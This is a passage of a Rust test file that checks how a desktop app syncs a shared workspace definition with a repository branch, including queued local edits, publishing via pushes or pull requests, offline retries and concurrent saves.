    fx.workspaces.rename(&fx.ws_id, "Renamed".into()).unwrap();
    let view = record_local_edit(&fx.stores(), &repo, &fx.ws_id, false)
        .unwrap()
        .unwrap();
    assert!(view.cache.pending.contains_key("verifyPipeline"));
    let report = fx.refresh(&repo);
    assert!(report.changes.is_empty(), "{:?}", report.changes);
    assert_eq!(
        fx.configs.get(&fx.ws_id).unwrap().verify_pipeline,
        Some(vec![VerifyKind::Script {
            path: "scripts/test.sh".into()
        }])
    );
}

#[test]
fn shared_field_setters_record_their_edit_under_the_definition_lock() {
    let commands = include_str!("commands.rs");
    assert!(!commands.contains("spawn_after_local_edit"));
    for setter in [
        "pub async fn workspace_rename(",
        "pub async fn workspace_set_accent_color(",
        "fn set_kanban_sync_mode_blocking<",
        "pub async fn project_config_set(",
        "pub async fn project_config_apply_template(",
        "pub async fn project_config_delete(",
    ] {
        let start = commands
            .find(setter)
            .unwrap_or_else(|| panic!("{setter} not found"));
        assert!(
            commands[start..start + 2000].contains("workspace_definition::edit_shared(")
                || commands[start..start + 2000].contains("workspace_definition::edit_shared_named("),
            "{setter} must mutate inside edit_shared"
        );
    }
    let a = workspace_lock("ws-lock");
    assert!(std::sync::Arc::ptr_eq(&a, &workspace_lock("ws-lock")));
    assert!(!std::sync::Arc::ptr_eq(&a, &workspace_lock("ws-other")));
}

// ── Review round 2 (snapshot 2) ───────────────────────────────────────

#[test]
fn a_project_config_reset_keeps_the_definition_cache_and_its_pending_edits() {
    let fx = Fixture::new();
    fx.configs
        .set(&fx.ws_id, crate::project_config::default_atelier_config())
        .unwrap();
    let repo = FakeRepo::new();
    repo.put(
        "main",
        DEFINITION_PATH,
        r#"{ "name": "Shared", "board": "local" }"#,
        "a",
        "c1",
    );
    fx.refresh(&repo);
    fx.workspaces.rename(&fx.ws_id, "Mine".into()).unwrap();
    record_local_edit(&fx.stores(), &repo, &fx.ws_id, false).unwrap();
    std::fs::write(fx.configs.workspace_dir(&fx.ws_id).join("intake.md"), "x").unwrap();

    crate::commands::project_config_reset(&fx.configs, &fx.ws_id).unwrap();
    assert!(fx.configs.get(&fx.ws_id).is_none());
    assert!(!fx
        .configs
        .workspace_dir(&fx.ws_id)
        .join("intake.md")
        .exists());
    let cache = fx.cache().expect("the definition cache survives a Reset");
    assert!(cache.pending.contains_key("name"));
    assert!(
        crate::shared_config::load_queue(&fx.configs, &fx.ws_id)
            .fields
            .contains_key("name"),
        "and so does the publish queue"
    );
    let view = record_local_edit(&fx.stores(), &repo, &fx.ws_id, false)
        .unwrap()
        .unwrap();
    assert!(view.cache.pending.contains_key("name"));
    assert_eq!(
        fx.refresh(&repo).changes,
        vec![],
        "the pending name is not reverted"
    );
    assert_eq!(fx.ws().name, "Mine");

    // A shared project config is still refused.
    let fx = Fixture::new();
    let repo = FakeRepo::new();
    repo.put("main", DEFINITION_PATH, PLY_DEFINITION, "a", "c1");
    fx.refresh(&repo);
    assert!(crate::commands::project_config_reset(&fx.configs, &fx.ws_id).is_err());
    assert!(fx.configs.get(&fx.ws_id).is_some());

    // No definition at all: the old full reset.
    let fx = Fixture::new();
    fx.configs
        .set(&fx.ws_id, crate::project_config::default_atelier_config())
        .unwrap();
    crate::commands::project_config_reset(&fx.configs, &fx.ws_id).unwrap();
    assert!(!fx.configs.workspace_dir(&fx.ws_id).exists());
}

// ── Review round 3 (snapshot 3) ───────────────────────────────────────

#[test]
fn a_definition_only_on_the_configured_target_branch_is_discovered() {
    let fx = Fixture::new();
    let mut cfg = crate::project_config::default_atelier_config();
    cfg.target_branch = "staging".into();
    fx.configs.set(&fx.ws_id, cfg).unwrap();
    let repo = FakeRepo::new();
    let on_staging = PLY_DEFINITION.replace(
        "\"schemaVersion\": 1,",
        "\"schemaVersion\": 1, \"integrationBranch\": \"staging\",",
    );
    repo.put("staging", DEFINITION_PATH, &on_staging, "a", "c1");
    let report = fx.refresh(&repo);
    assert!(report.has_definition);
    assert_eq!(report.branch.as_deref(), Some("staging"));
    assert_eq!(fx.ws().name, "Ply");
    assert_eq!(fx.configs.get(&fx.ws_id).unwrap().target_branch, "staging");
}

#[test]
fn an_unreadable_file_on_the_named_integration_branch_is_reported_not_skipped() {
    let fx = Fixture::new();
    let repo = FakeRepo::new();
    let names_staging = PLY_DEFINITION.replace(
        "\"schemaVersion\": 1,",
        "\"schemaVersion\": 1, \"integrationBranch\": \"staging\",",
    );
    repo.put("main", DEFINITION_PATH, &names_staging, "a", "c1");
    repo.put(
        "staging",
        DEFINITION_PATH,
        &with_verify("scripts/staging.sh").replace(
            "\"schemaVersion\": 1,",
            "\"schemaVersion\": 1, \"integrationBranch\": \"staging\",",
        ),
        "b",
        "c2",
    );
    fx.refresh(&repo);
    let good = fx.cache().unwrap();

    // Staging breaks; main still names it. The error shows, the last good
    // (staging) copy stays applied — main's pipeline is not run instead.
    let fx2 = Fixture::new();
    repo.put(
        "staging",
        DEFINITION_PATH,
        "{ \"schemaVersion\": 9, \"name\": \"x\" }",
        "b",
        "c3",
    );
    let report = fx.refresh(&repo);
    assert!(report.unreadable.is_some());
    assert_eq!(fx.cache().unwrap().definition, good.definition);
    assert_eq!(
        fx.configs.get(&fx.ws_id).unwrap().verify_pipeline,
        Some(vec![VerifyKind::Script {
            path: "scripts/staging.sh".into()
        }])
    );
    // With no cache at all, the hop's error still wins over main's copy.
    let report = fx2.refresh(&repo);
    assert!(report.unreadable.is_some());
    assert!(!report.has_definition);
    assert_eq!(fx2.ws().name, "atelier");
}

#[test]
fn save_merges_the_draft_under_the_lock_against_the_current_definition() {
    let fx = Fixture::new();
    let repo = FakeRepo::new();
    repo.put("main", DEFINITION_PATH, PLY_DEFINITION, "a", "c1");
    fx.refresh(&repo);
    // The editor opens on this.
    let base = to_map(
        &get_view(&fx.stores(), &repo, &fx.ws_id)
            .unwrap()
            .effective
            .unwrap(),
    );
    let mut draft = base.clone();
    draft.insert("name".into(), Value::from("Renamed"));
    draft.remove("accentColor");

    // Meanwhile the repository's pipeline changes and a refresh applies it.
    repo.put(
        "main",
        DEFINITION_PATH,
        &with_verify("scripts/remote.sh"),
        "b",
        "c2",
    );
    fx.refresh(&repo);

    let view = save_changes(&fx.stores(), &repo, &fx.ws_id, base, draft).unwrap();
    let pending: Vec<_> = view.cache.pending.keys().cloned().collect();
    assert_eq!(pending, vec!["accentColor".to_string(), "name".to_string()]);
    assert_eq!(
        fx.configs.get(&fx.ws_id).unwrap().verify_pipeline,
        Some(vec![VerifyKind::Script {
            path: "scripts/remote.sh".into()
        }]),
        "the repository's new pipeline is kept"
    );
    assert_eq!(fx.ws().name, "Renamed");
    assert_eq!(fx.ws().accent_color, None);

    let bad = save_changes(
        &fx.stores(),
        &repo,
        &fx.ws_id,
        Map::new(),
        serde_json::json!({ "board": 5 })
            .as_object()
            .unwrap()
            .clone(),
    );
    assert!(bad
        .unwrap_err()
        .contains("Not a valid workspace definition"));
}

// ── A read for a page (two-account walk, 2026-11-02) ──────────────────

#[test]
fn a_read_for_a_page_changes_this_mac_and_publishes_nothing() {
    let fx = Fixture::new();
    let repo = FakeRepo::new();
    repo.put("main", DEFINITION_PATH, PLY_DEFINITION, "a", "c1");
    refresh_with(&fx.stores(), &repo, &fx.ws_id, RefreshMoment::Open).unwrap();
    // The person changed a shared field; its publish hasn't gone through yet.
    fx.workspaces.rename(&fx.ws_id, "Renamed".into()).unwrap();
    record_local_edit(&fx.stores(), &repo, &fx.ws_id, false).unwrap();
    assert!(!fx.queue().is_empty());
    // Meanwhile the owner moved another field on the branch.
    let moved = PLY_DEFINITION.replace("#7c3aed", "#123456");
    repo.put("main", DEFINITION_PATH, &moved, "b", "c2");

    let publisher = FakePublisher::default();
    let report = read_at_moment(&fx.stores(), &repo, &publisher, &fx.ws_id, RefreshMoment::PageRead).unwrap();
    assert!(publisher.requests.borrow().is_empty(), "opening a page pushes nothing");
    assert!(report.publish.is_none());
    assert!(report.changes.iter().any(|c| c.field == "accentColor"), "{:?}", report.changes);
    // The edit is untouched and still queued.
    assert_eq!(fx.ws().name, "Renamed");
    assert!(report.pending_fields.iter().any(|f| f == "name"), "{:?}", report.pending_fields);
    assert!(!fx.queue().is_empty());

    // The next read that drains publishes it.
    let report = read_at_moment(&fx.stores(), &repo, &publisher, &fx.ws_id, RefreshMoment::Periodic).unwrap();
    assert_eq!(publisher.requests.borrow().len(), 1);
    assert!(report.publish.is_some());
}

#[test]
fn a_read_for_a_page_runs_neither_the_library_nor_the_directions() {
    assert!(RefreshMoment::PageRead.only_reads());
    for moment in [
        RefreshMoment::Open,
        RefreshMoment::Sync,
        RefreshMoment::StartBuild,
        RefreshMoment::Periodic,
        RefreshMoment::Publish,
    ] {
        assert!(!moment.only_reads(), "{moment:?}");
    }
    // Both drains push; `next_improvement::drain` also runs `adopt_local`.
    let module = include_str!("workspace_definition.rs");
    let start = module.find("pub fn refresh_definition<").unwrap();
    let body = &module[start..start + 1600];
    let gate = body.find("if !moment.only_reads()").expect("the gate");
    assert!(gate < body.find("sync_library(").unwrap());
    assert!(gate < body.find("next_improvement::drain(").unwrap());
}

// ── Review round 4 (snapshot 4) ───────────────────────────────────────

#[test]
fn the_editor_refuses_edits_it_cannot_record_instead_of_dropping_them() {
    let fx = Fixture::new();
    let repo = FakeRepo::new();
    repo.put(
        "main",
        DEFINITION_PATH,
        &PLY_DEFINITION.replace(
            "\"schemaVersion\": 1,",
            "\"schemaVersion\": 1, \"futureKey\": 1,",
        ),
        "a",
        "c1",
    );
    fx.refresh(&repo);
    let base = to_map(
        &get_view(&fx.stores(), &repo, &fx.ws_id)
            .unwrap()
            .effective
            .unwrap(),
    );

    let mut unknown = base.clone();
    unknown.insert("futureKey".into(), Value::from(2));
    unknown.insert("brandNew".into(), Value::from(true));
    let err = save_changes(&fx.stores(), &repo, &fx.ws_id, base.clone(), unknown).unwrap_err();
    assert!(err.contains("brandNew, futureKey"), "{err}");

    let mut no_project = base.clone();
    for key in PROJECT_FIELDS {
        no_project.remove(*key);
    }
    // 1.173.0 (B1): areas are shared on their own, never part of the
    // project config — a definition holding only areas shares none.
    assert!(!is_project_field("areas"));
    assert!(!parse_definition(br#"{ "name": "x", "areas": [{ "id": "site", "path": "web" }] }"#)
        .unwrap()
        .has_project());
    let err = save_changes(&fx.stores(), &repo, &fx.ws_id, base.clone(), no_project).unwrap_err();
    assert!(err.contains("whole project config"), "{err}");

    // Nothing was applied or recorded by either refusal.
    let cache = fx.cache().unwrap();
    assert!(cache.pending.is_empty());
    assert!(fx.configs.get(&fx.ws_id).unwrap().verify_pipeline.is_some());

    // Untouched unknown keys ride along with a supported edit.
    let mut rename = base.clone();
    rename.insert("name".into(), Value::from("Renamed"));
    assert!(save_changes(&fx.stores(), &repo, &fx.ws_id, base, rename).is_ok());
}

#[test]
fn concurrent_workspace_saves_leave_a_whole_current_file() {
    let dir = tempfile::tempdir().unwrap();
    let store = std::sync::Arc::new(WorkspaceStore::new(dir.path().to_path_buf()).unwrap());
    let ids: Vec<String> = (0..8)
        .map(|i| {
            let cwd = dir.path().join(format!("repo{i}"));
            std::fs::create_dir_all(&cwd).unwrap();
            store
                .create(format!("w{i}"), cwd.to_string_lossy().to_string())
                .unwrap()
                .id
        })
        .collect();
    let barrier = std::sync::Arc::new(std::sync::Barrier::new(ids.len()));
    let handles: Vec<_> = ids
        .iter()
        .cloned()
        .map(|id| {
            let store = store.clone();
            let barrier = barrier.clone();
            std::thread::spawn(move || {
                barrier.wait();
                for round in 0..25 {
                    store
                        .set_accent_color(&id, Some(format!("#{round:06}")))
                        .unwrap();
                    store.rename(&id, format!("{id}-{round}")).unwrap();
                }
            })
        })
        .collect();
    for handle in handles {
        handle.join().unwrap();
    }
    let on_disk: WorkspacesFile =
        serde_json::from_slice(&std::fs::read(dir.path().join("workspaces.json")).unwrap())
            .unwrap();
    let names = |f: &WorkspacesFile| {
        f.workspaces
            .iter()
            .map(|w| (w.name.clone(), w.accent_color.clone()))
            .collect::<Vec<_>>()
    };
    assert_eq!(names(&on_disk), names(&store.snapshot()));
    for (name, accent) in names(&on_disk) {
        assert!(name.ends_with("-24"), "{name}");
        assert_eq!(accent.as_deref(), Some("#000024"));
    }
}

// ── Review round 5 (snapshot 5) ───────────────────────────────────────

#[test]
fn a_pending_project_edit_over_a_repo_that_drops_its_project_part_keeps_the_config_whole() {
    let fx = Fixture::new();
    let repo = FakeRepo::new();
    repo.put("main", DEFINITION_PATH, PLY_DEFINITION, "a", "c1");
    fx.refresh(&repo);
    let before = fx.configs.get(&fx.ws_id).unwrap();

    let mut cfg = before.clone();
    cfg.verify_pipeline = Some(vec![VerifyKind::Script {
        path: "scripts/mine.sh".into(),
    }]);
    fx.configs.set(&fx.ws_id, cfg).unwrap();
    record_local_edit(&fx.stores(), &repo, &fx.ws_id, false).unwrap();

    // The repository stops sharing a project config.
    repo.put("main", DEFINITION_PATH, r##"{ "name": "Ply", "accentColor": "#7c3aed", "board": "githubIssues", "githubOwnerRepo": "MatteoB-adv/atelier" }"##, "b", "c2");
    let report = fx.refresh(&repo);
    assert!(report.changes.is_empty(), "{:?}", report.changes);
    let after = fx.configs.get(&fx.ws_id).unwrap();
    assert_eq!(
        after.target_branch, "main",
        "never an empty integration branch"
    );
    assert_eq!(after.version_files, before.version_files);
    assert_eq!(after.install_script, before.install_script);
    assert_eq!(
        after.verify_pipeline,
        Some(vec![VerifyKind::Script {
            path: "scripts/mine.sh".into()
        }])
    );
    let effective = get_view(&fx.stores(), &repo, &fx.ws_id)
        .unwrap()
        .effective
        .unwrap();
    assert_eq!(effective.integration_branch.as_deref(), Some("main"));
    assert_eq!(
        effective.version_files.as_ref(),
        Some(&before.version_files)
    );
}

// ── Review round 10 (snapshot 10) ─────────────────────────────────────

#[test]
fn a_named_branch_without_the_file_does_not_strand_later_refreshes() {
    let fx = Fixture::new();
    let repo = FakeRepo::new();
    let names_staging = PLY_DEFINITION.replace(
        "\"schemaVersion\": 1,",
        "\"schemaVersion\": 1, \"integrationBranch\": \"staging\",",
    );
    repo.put("main", DEFINITION_PATH, &names_staging, "a", "c1");
    fx.refresh(&repo);
    assert_eq!(fx.cache().unwrap().branch.as_deref(), Some("main"));

    // A correction on main is still picked up.
    repo.put(
        "main",
        DEFINITION_PATH,
        &with_verify("scripts/fixed.sh"),
        "b",
        "c2",
    );
    let report = fx.refresh(&repo);
    assert_eq!(report.branch.as_deref(), Some("main"));
    assert_eq!(
        fx.configs.get(&fx.ws_id).unwrap().verify_pipeline,
        Some(vec![VerifyKind::Script {
            path: "scripts/fixed.sh".into()
        }])
    );
    assert_eq!(fx.configs.get(&fx.ws_id).unwrap().target_branch, "main");
}

// ── Review round 11 (snapshot 11) ─────────────────────────────────────

#[test]
fn removing_the_integration_branch_moves_refreshes_back_to_the_default_branch() {
    let fx = Fixture::new();
    let repo = FakeRepo::new();
    let names_staging = |script: &str| {
        with_verify(script).replace(
            "\"schemaVersion\": 1,",
            "\"schemaVersion\": 1, \"integrationBranch\": \"staging\",",
        )
    };
    repo.put(
        "main",
        DEFINITION_PATH,
        &names_staging("scripts/a.sh"),
        "a",
        "c1",
    );
    repo.put(
        "staging",
        DEFINITION_PATH,
        &names_staging("scripts/a.sh"),
        "a",
        "c2",
    );
    assert_eq!(fx.refresh(&repo).branch.as_deref(), Some("staging"));

    // Staging's copy drops integrationBranch: the default branch again.
    repo.put(
        "staging",
        DEFINITION_PATH,
        &with_verify("scripts/b.sh"),
        "b",
        "c3",
    );
    repo.put(
        "main",
        DEFINITION_PATH,
        &with_verify("scripts/main.sh"),
        "b",
        "c4",
    );
    let report = fx.refresh(&repo);
    assert_eq!(report.branch.as_deref(), Some("main"));
    let cfg = fx.configs.get(&fx.ws_id).unwrap();
    assert_eq!(cfg.target_branch, "main");
    assert_eq!(
        cfg.verify_pipeline,
        Some(vec![VerifyKind::Script {
            path: "scripts/main.sh".into()
        }])
    );
    // And later updates on main arrive.
    repo.put(
        "main",
        DEFINITION_PATH,
        &with_verify("scripts/main2.sh"),
        "c",
        "c5",
    );
    assert_eq!(fx.refresh(&repo).branch.as_deref(), Some("main"));
    assert_eq!(
        fx.configs.get(&fx.ws_id).unwrap().verify_pipeline,
        Some(vec![VerifyKind::Script {
            path: "scripts/main2.sh".into()
        }])
    );
}

// ── The write channel (GH #80) ────────────────────────────────────────

/// A write channel without a remote: records what it was asked to publish and
/// answers with the next scripted outcome (by default, everything published).
#[derive(Default)]
struct FakePublisher {
    outcomes: RefCell<Vec<PublishOutcome>>,
    pr_states: RefCell<HashMap<u64, PrState>>,
    /// The pull requests asked about, in order (winfix follow-up).
    state_asks: RefCell<Vec<u64>>,
    requests: RefCell<Vec<(String, BTreeMap<String, QueuedField>, Option<WorkspaceDefinition>)>>,
    /// The fallback branch each request carried, and whether the queue file
    /// already held it when the publish ran.
    pr_branches: RefCell<Vec<(String, Option<String>)>>,
    /// The project fill each request carried.
    fills: RefCell<Vec<Option<WorkspaceDefinition>>>,
    /// The queue file, to see what was saved before the attempt.
    queue_file: RefCell<Option<std::path::PathBuf>>,
    /// PRs closed, and whether closing fails.
    closed: RefCell<Vec<u64>>,
    close_fails: std::cell::Cell<bool>,
    withdrawn_branches: RefCell<Vec<String>>,
    /// Round 3 (S4): the pull requests each request said it replaces.
    replaced: RefCell<Vec<Vec<u64>>>,
    /// C4 round 2: what a close answers with, and a pull request found not
    /// to be this computer's.
    close_error: RefCell<Option<String>>,
    not_ours: RefCell<bool>,
    /// What the branch holds, for the default "published" outcome.
    branch_text: RefCell<Option<String>>,
}

impl FakePublisher {
    fn then(self, outcome: PublishOutcome) -> Self {
        self.outcomes.borrow_mut().push(outcome);
        self
    }
}

impl Publisher for FakePublisher {
    fn publish(&self, request: &PublishRequest<'_>) -> PublishOutcome {
        let saved = self.queue_file.borrow().as_ref().and_then(|path| {
            serde_json::from_slice::<PublishQueue>(&std::fs::read(path).ok()?)
                .ok()?
                .pull_request_branch
        });
        self.pr_branches
            .borrow_mut()
            .push((request.pull_request_branch.to_string(), saved));
        self.fills.borrow_mut().push(request.project_fill.cloned());
        self.replaced.borrow_mut().push(request.replaces.iter().map(|pr| pr.number).collect());
        self.requests.borrow_mut().push((
            request.branch.to_string(),
            request.fields.clone(),
            request.create_from.cloned(),
        ));
        if !self.outcomes.borrow().is_empty() {
            return self.outcomes.borrow_mut().remove(0);
        }
        let repo = READ_LAST.with(|last| last.get());
        let on_the_branch = ON_THE_BRANCH.with(|files| {
            files.borrow().get(&(repo, request.branch.to_string(), DEFINITION_PATH.to_string())).cloned()
        });
        let base = match (self.branch_text.borrow().as_deref(), request.create_from, on_the_branch) {
            (Some(text), _, _) => parse_definition(text.as_bytes()).unwrap(),
            (None, Some(copy), _) => copy.clone(),
            (None, None, Some(text)) => parse_definition(text.as_bytes()).unwrap(),
            // As the channel: nothing on the branch and no copy to create it from.
            (None, None, None) => {
                return PublishOutcome::Failed(format!("{} has no {DEFINITION_PATH} to change", request.branch))
            }
        };
        let fields = request
            .fields
            .iter()
            .map(|(k, f)| (k.clone(), f.value.clone()))
            .collect();
        let text = file_text(&base, None, &fields, request.default_branch);
        PublishOutcome::Published {
            conflicts: Default::default(),
            commit: "pushed1".into(),
            definition: parse_definition(text.as_bytes()).unwrap(),
            author: Some("me".into()),
            fields: request.fields.keys().cloned().collect(),
            overrides: Vec::new(),
            pushed: true,
        }
    }
    fn pull_request_state(&self, pr: &PullRequest) -> Option<PrState> {
        self.state_asks.borrow_mut().push(pr.number);
        self.pr_states.borrow().get(&pr.number).copied()
    }
    fn close_pull_request(&self, pr: &PullRequest) -> Result<(), String> {
        if let Some(e) = self.close_error.borrow().clone() {
            return Err(e);
        }
        if self.close_fails.get() {
            return Err("gh pr close timed out".into());
        }
        self.closed.borrow_mut().push(pr.number);
        Ok(())
    }
    fn withdraw_branch(&self, branch: &str) -> Result<Vec<u64>, String> {
        self.withdrawn_branches.borrow_mut().push(branch.to_string());
        Ok(Vec::new())
    }
    fn close_own_saying(&self, pr: &PullRequest, _comment: &str) -> Result<crate::shared_config::OwnClose, String> {
        if *self.not_ours.borrow() {
            return Ok(crate::shared_config::OwnClose::NotOurs);
        }
        match self.pull_request_state(pr) {
            Some(PrState::Merged) | Some(PrState::Closed) => Ok(crate::shared_config::OwnClose::Settled),
            _ => self.close_pull_request(pr).map(|()| crate::shared_config::OwnClose::Closed),
        }
    }
}

fn pipeline(path: &str) -> Value {
    serde_json::json!([{ "kind": "script", "path": path }])
}

fn set_pipeline(fx: &Fixture, path: &str) {
    let mut cfg = fx.configs.get(&fx.ws_id).unwrap();
    cfg.verify_pipeline = Some(vec![VerifyKind::Script { path: path.into() }]);
    fx.configs.set(&fx.ws_id, cfg).unwrap();
}

#[test]
fn a_local_edit_applies_at_once_is_queued_and_kept_until_the_repo_has_it() {
    let fx = Fixture::new();
    let repo = FakeRepo::new();
    repo.put("main", DEFINITION_PATH, PLY_DEFINITION, "a", "c1");
    fx.refresh(&repo);

    set_pipeline(&fx, "scripts/mine.sh");
    let view = record_local_edit(&fx.stores(), &repo, &fx.ws_id, false)
        .unwrap()
        .unwrap();
    assert_eq!(view.cache.pending_state, Some(PendingState::PendingSync));
    let queued = &fx.queue().fields["verifyPipeline"];
    assert_eq!(queued.value, pipeline("scripts/mine.sh"));
    assert_eq!(queued.base, pipeline("scripts/ppvp.sh"), "the value it replaces");
    assert_eq!(queued.base_commit.as_deref(), Some("c1"));
    assert_eq!(view.queue.fields.len(), 1);
    assert!(queue_path_exists(&fx));

    // Not on the branch yet: a refresh keeps the local value, and another
    // field changed upstream still arrives.
    repo.put(
        "main",
        DEFINITION_PATH,
        &PLY_DEFINITION.replace("#7c3aed", "#ff0000"),
        "other",
        "c2",
    );
    let report = fx.refresh(&repo);
    assert_eq!(
        report.changes.iter().map(|c| c.field.as_str()).collect::<Vec<_>>(),
        vec!["accentColor"]
    );
    assert_eq!(report.pending_fields, vec!["verifyPipeline".to_string()]);
    assert_eq!(
        fx.configs.get(&fx.ws_id).unwrap().verify_pipeline,
        Some(vec![VerifyKind::Script { path: "scripts/mine.sh".into() }])
    );

    // A second edit of the same field keeps the base it was first queued over.
    set_pipeline(&fx, "scripts/mine2.sh");
    record_local_edit(&fx.stores(), &repo, &fx.ws_id, false).unwrap();
    let queued = &fx.queue().fields["verifyPipeline"];
    assert_eq!(queued.value, pipeline("scripts/mine2.sh"));
    assert_eq!(queued.base, pipeline("scripts/ppvp.sh"));

    // Someone publishes the same value: nothing left to publish.
    repo.put(
        "main",
        DEFINITION_PATH,
        &with_verify("scripts/mine2.sh").replace("#7c3aed", "#ff0000"),
        "other",
        "c3",
    );
    let report = fx.refresh(&repo);
    assert!(report.pending_fields.is_empty());
    assert!(fx.queue().is_empty());
    assert!(!queue_path_exists(&fx), "an empty queue leaves no file");
    assert_eq!(fx.cache().unwrap().pending_state, None);

    // Setting a value back to the repo's before it was published unqueues it.
    fx.workspaces.rename(&fx.ws_id, "Mine".into()).unwrap();
    record_local_edit(&fx.stores(), &repo, &fx.ws_id, false).unwrap();
    assert!(fx.queue().fields.contains_key("name"));
    fx.workspaces.rename(&fx.ws_id, "Ply".into()).unwrap();
    let view = record_local_edit(&fx.stores(), &repo, &fx.ws_id, false)
        .unwrap()
        .unwrap();
    assert!(view.cache.pending.is_empty() && fx.queue().is_empty());
}

fn queue_path_exists(fx: &Fixture) -> bool {
    crate::shared_config::queue_path(&fx.configs, &fx.ws_id).exists()
}

#[test]
fn a_drain_publishes_the_queue_and_the_cache_follows_the_branch() {
    let fx = Fixture::new();
    let repo = FakeRepo::new();
    repo.put("main", DEFINITION_PATH, PLY_DEFINITION, "a", "c1");
    fx.refresh(&repo);
    set_pipeline(&fx, "scripts/mine.sh");
    fx.workspaces
        .set_accent_color(&fx.ws_id, Some("#000000".into()))
        .unwrap();
    record_local_edit(&fx.stores(), &repo, &fx.ws_id, false).unwrap();

    let publisher = FakePublisher::default();
    *publisher.branch_text.borrow_mut() = Some(PLY_DEFINITION.to_string());
    let report = publish_pending(&fx.stores(), &repo, &publisher, &fx.ws_id)
        .unwrap()
        .unwrap();
    // One publish, both fields, onto the branch the definition was read from.
    let requests = publisher.requests.borrow();
    assert_eq!(requests.len(), 1);
    assert_eq!(requests[0].0, "main");
    assert_eq!(
        requests[0].1.keys().collect::<Vec<_>>(),
        vec!["accentColor", "verifyPipeline"]
    );
    assert_eq!(report.published, vec!["accentColor", "verifyPipeline"]);
    assert_eq!(report.commit.as_deref(), Some("pushed1"));
    assert!(report.error.is_none());

    let cache = fx.cache().unwrap();
    assert!(cache.pending.is_empty());
    assert_eq!(cache.pending_state, None);
    assert_eq!(cache.commit.as_deref(), Some("pushed1"));
    assert_eq!(cache.author.as_deref(), Some("me"));
    assert!(fx.queue().is_empty());

    // Nothing queued: no publish at all.
    assert!(publish_pending(&fx.stores(), &repo, &publisher, &fx.ws_id)
        .unwrap()
        .is_none());
    assert_eq!(publisher.requests.borrow().len(), 1);

    // The refresh that follows reads the published branch: no toast.
    repo.put(
        "main",
        DEFINITION_PATH,
        &with_verify("scripts/mine.sh").replace("#7c3aed", "#000000"),
        "me",
        "pushed1",
    );
    assert!(fx.refresh(&repo).changes.is_empty());
}

#[test]
fn offline_the_value_applies_locally_the_queue_survives_a_restart_and_drains() {
    let fx = Fixture::new();
    let repo = FakeRepo::new();
    repo.put("main", DEFINITION_PATH, PLY_DEFINITION, "a", "c1");
    fx.refresh(&repo);
    fx.workspaces
        .set_accent_color(&fx.ws_id, Some("#00ff00".into()))
        .unwrap();
    record_local_edit(&fx.stores(), &repo, &fx.ws_id, false).unwrap();

    let offline = FakePublisher::default().then(PublishOutcome::Unreachable(
        "fatal: unable to access 'https://github.com/o/r/': Could not resolve host".into(),
    ));
    let report = publish_pending(&fx.stores(), &repo, &offline, &fx.ws_id)
        .unwrap()
        .unwrap();
    assert!(report.offline);
    assert!(report.published.is_empty());
    let queue = fx.queue();
    assert_eq!(queue.fields["accentColor"].attempts, 1);
    assert!(queue.fields["accentColor"].last_error.is_some());
    let cache = fx.cache().unwrap();
    assert_eq!(cache.pending_state, Some(PendingState::PendingSync));
    assert_eq!(fx.ws().accent_color.as_deref(), Some("#00ff00"));
    let row = crate::doctor::shared_definition_status("Ply", &cache, &queue, &[]).unwrap();
    assert_eq!((row.state, row.summary.as_str()), ("pending", "Pending sync"));
    assert!(row.detail.contains("Could not resolve host"), "{}", row.detail);

    // Cmd-Q and relaunch: the queue file is still there, and the next Sync
    // drains it.
    let fx = fx.restart();
    assert_eq!(fx.queue(), queue);
    let online = FakePublisher::default();
    *online.branch_text.borrow_mut() = Some(PLY_DEFINITION.to_string());
    let report = publish_pending(&fx.stores(), &repo, &online, &fx.ws_id)
        .unwrap()
        .unwrap();
    assert_eq!(report.published, vec!["accentColor"]);
    assert!(fx.queue().is_empty());
    assert_eq!(fx.cache().unwrap().pending_state, None);
    assert_eq!(fx.ws().accent_color.as_deref(), Some("#00ff00"));
}

#[test]
fn a_refused_push_waits_in_a_pull_request_until_it_merges_or_closes() {
    let pr = PullRequest {
        number: 7,
        url: "https://github.com/o/r/pull/7".into(),
        branch: "atelier/config-verify-pipeline-1".into(),
        head: None,
    };
    let fx = Fixture::new();
    let repo = FakeRepo::new();
    repo.put("main", DEFINITION_PATH, PLY_DEFINITION, "a", "c1");
    fx.refresh(&repo);
    set_pipeline(&fx, "scripts/mine.sh");
    record_local_edit(&fx.stores(), &repo, &fx.ws_id, false).unwrap();

    let publisher = FakePublisher::default().then(PublishOutcome::PullRequest {
        conflicts: Default::default(),
        pull_request: pr.clone(),
        fields: vec!["verifyPipeline".into()],
    });
    let report = publish_pending(&fx.stores(), &repo, &publisher, &fx.ws_id)
        .unwrap()
        .unwrap();
    assert_eq!(report.pull_request.as_ref(), Some(&pr));
    let cache = fx.cache().unwrap();
    assert_eq!(cache.pending_state, Some(PendingState::WaitingForPr));
    let view = get_view(&fx.stores(), &repo, &fx.ws_id).unwrap();
    assert_eq!(
        view.queue.fields["verifyPipeline"].pull_request.as_ref(),
        Some(&pr)
    );
    let row = crate::doctor::shared_definition_status("Ply", &cache, &fx.queue(), &[]).unwrap();
    assert_eq!(row.summary, "Waiting for PR #7 to merge");

    // Still open: the local value stays, nothing is published again.
    publisher.pr_states.borrow_mut().insert(7, PrState::Open);
    publish_pending(&fx.stores(), &repo, &publisher, &fx.ws_id).unwrap();
    assert_eq!(publisher.requests.borrow().len(), 1);
    assert!(fx.refresh(&repo).changes.is_empty());
    assert_eq!(
        fx.configs.get(&fx.ws_id).unwrap().verify_pipeline,
        Some(vec![VerifyKind::Script { path: "scripts/mine.sh".into() }])
    );

    // Merged: the queue lets go and the branch carries the value.
    publisher.pr_states.borrow_mut().insert(7, PrState::Merged);
    publish_pending(&fx.stores(), &repo, &publisher, &fx.ws_id).unwrap();
    assert!(fx.queue().is_empty());
    repo.put("main", DEFINITION_PATH, &with_verify("scripts/mine.sh"), "reviewer", "c2");
    assert!(fx.refresh(&repo).changes.is_empty());

    // Closed without merging: the value is dropped, the repo's comes back.
    set_pipeline(&fx, "scripts/again.sh");
    record_local_edit(&fx.stores(), &repo, &fx.ws_id, false).unwrap();
    let publisher = FakePublisher::default().then(PublishOutcome::PullRequest {
        conflicts: Default::default(),
        pull_request: PullRequest { number: 8, ..pr },
        fields: vec!["verifyPipeline".into()],
    });
    publish_pending(&fx.stores(), &repo, &publisher, &fx.ws_id).unwrap();
    publisher.pr_states.borrow_mut().insert(8, PrState::Closed);
    let report = publish_pending(&fx.stores(), &repo, &publisher, &fx.ws_id)
        .unwrap()
        .unwrap();
    assert_eq!(report.closed_pull_requests, vec![8]);
    assert!(fx.queue().is_empty());
    let report = fx.refresh(&repo);
    assert_eq!(report.changes.len(), 1);
